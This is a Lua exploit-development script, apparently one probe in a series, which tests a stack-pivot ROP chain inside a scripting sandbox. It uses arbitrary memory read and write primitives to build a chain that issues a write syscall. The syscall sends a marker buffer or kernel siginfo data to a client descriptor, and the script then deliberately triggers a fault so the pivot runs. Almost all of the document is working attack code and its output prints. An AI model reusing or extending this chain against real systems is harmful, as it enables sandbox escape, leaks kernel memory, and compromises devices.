-- CRASH_CLASS: HIGH
-- PROBE 993b: does a rebuilt pivot chain run at all?
--
-- 993a rebuilt the signal chain to copy the kernel's siginfo and got nothing back, so
-- first prove the mechanism: build a chain that writes a known buffer to the client fd,
-- then fault. If the marker arrives, the pivot and the chain layout are right and only
-- the register choice in 993a was wrong.

local VARIANT = "B"   -- "A" = write our own buffer, "B" = write from RSI (siginfo)

print("=== PROBE 993b: CHAIN SELF TEST (" .. VARIANT .. ") ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) else return nil end end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end

print(string.format("[A] pid=%u", to_num(mk(20)())))
local ph = gadgets.stack_pivot[1]
local pivot_addr = to_num(ph.pivot_addr)
print(string.format("[B] pivot=0x%X gadget=0x%X", pivot_addr, to_num(ph.gadget_addr)))
print(string.format("[C] chain before: %016X %016X %016X", rq(pivot_addr) or 0, rq(pivot_addr+8) or 0, rq(pivot_addr+0x10) or 0))

local buf = memory.alloc(0x40)
local msg = "CHAIN-OK-9F3A"
for i = 1, #msg do wb(buf + i - 1, msg:byte(i)) end
wb(buf + #msg, 0)
local bufaddr = as_addr(buf)

local chain = ropchain({ stack_base = pivot_addr })
if VARIANT == "A" then
    chain:push_syscall_raw(syscall.write, function()
        chain:push_set_rdx(#msg)
        chain:push_set_rsi(bufaddr)
        chain:push_set_reg_from_memory("rdi", signal.fd_addr)
    end)
else
    chain:push_syscall_raw(syscall.write, function()
        chain:push_set_rdx(0x80)
        chain:push_set_reg_from_memory("rdi", signal.fd_addr)
    end)
end
print(string.format("[D] chain after:  %016X %016X %016X", rq(pivot_addr) or 0, rq(pivot_addr+8) or 0, rq(pivot_addr+0x10) or 0))
print("[E] faulting now")
local ok = pcall(function() return memory.read_qword(0xFFFFFFFF80000000) end)
print(string.format("[F] returned ok=%s", tostring(ok)))
print("=== COMPLETE ===")
